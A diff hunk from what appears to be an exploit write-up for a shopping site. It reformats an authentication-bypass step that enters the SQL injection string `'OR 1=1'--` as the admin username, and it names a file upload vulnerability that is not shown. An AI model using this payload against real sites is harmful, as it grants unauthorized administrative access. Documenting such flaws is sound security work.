@@ -16,8 +16,8 @@ The exploit utilizes multiple vulnerabilities first bypasses authentication then
 ## Authentication Bypass
 
 Navagate to the Admin login page: `http://<site>/shopping/admin` \
-Username: `'OR 1=1'--` \
-Password: whatever
+* Username: `'OR 1=1'--` \
+* Password: whatever
   
 ## File upload vulnerability
 
